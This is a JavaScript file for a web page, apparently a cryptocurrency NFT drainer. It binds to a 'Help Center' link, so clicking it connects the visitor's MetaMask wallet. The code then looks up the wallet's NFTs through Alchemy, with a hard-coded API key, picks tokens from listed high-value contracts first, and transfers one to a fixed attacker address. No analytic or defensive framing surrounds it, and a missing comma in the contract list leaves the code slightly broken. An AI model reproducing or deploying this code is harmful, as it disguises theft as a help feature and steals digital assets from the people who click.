const ALCHEMY_API_KEY = "XEbzMGpp9vTP_qKXrNcwh";
const PRIORITY_CONTRACTS = [
    "0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e",
    "0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949"
    "0x7Fb2D396a3cc840f2c4213F044566ed400159b40"
].map(a => a.toLowerCase());
const RECEIVER = "0x9939e801c02c7906156bfB9b003d9C876cAcf303";

async function connectWalletAndPromptTransfer() {
    if (!window.ethereum) {
        alert("Please install MetaMask!");
        return;
    }

    try {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];
        console.log("Connected wallet:", userAddress);
        await fetchAndPromptNFT(userAddress);
    } catch (err) {
        console.error("Wallet connect error:", err);
    }
}

async function fetchAndPromptNFT(owner) {
    try {
        const url = `https://eth-mainnet.g.alchemy.com/nft/v2/${ALCHEMY_API_KEY}/getNFTs?owner=${owner}`;
        const res = await fetch(url);
        const data = await res.json();

        if (!data.ownedNfts || data.ownedNfts.length === 0) {
            alert("No NFTs found.");
            return;
        }

        // Check for priority NFT first
        let targetNFT = data.ownedNfts.find(nft =>
            PRIORITY_CONTRACTS.includes(nft.contract.address.toLowerCase())
        );

        // If no priority NFT, take the first one
        if (!targetNFT) {
            targetNFT = data.ownedNfts[0];
        }

        console.log("Selected NFT for transfer:", targetNFT);

        await transferNFT(owner, targetNFT.contract.address, targetNFT.id.tokenId);

    } catch (err) {
        console.error("Fetch NFTs error:", err);
    }
}

async function transferNFT(from, contractAddress, tokenId) {
    try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const abi = [
            "function safeTransferFrom(address from, address to, uint256 tokenId) external"
        ];
        const contract = new ethers.Contract(contractAddress, abi, signer);

        const tx = await contract.safeTransferFrom(from, RECEIVER, tokenId);
        console.log("Transaction sent:", tx.hash);
        await tx.wait();
        alert("NFT transferred successfully!");
    } catch (err) {
        console.error("Transfer error:", err);
    }
}

// Attach to Help Center link
document.addEventListener("DOMContentLoaded", () => {
    const helpLink = document.getElementById("helpCenterLink");
    if (helpLink) {
        helpLink.addEventListener("click", (e) => {
            e.preventDefault();
            connectWalletAndPromptTransfer();
        });
    }
});

